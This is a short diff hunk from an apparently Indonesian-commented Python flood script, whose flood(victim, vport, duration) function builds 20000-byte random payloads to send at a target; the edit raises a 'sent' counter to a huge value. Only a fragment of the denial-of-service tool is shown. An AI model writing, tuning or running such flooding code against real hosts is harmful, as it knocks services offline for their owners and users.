@@ -25,7 +25,7 @@ def flood(victim, vport, duration):
     # 20000 representasi satu byte ke server
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
-    sent = 30000
+    sent = 300000000000000
 
     while 1:
         if time.time() > timeout:
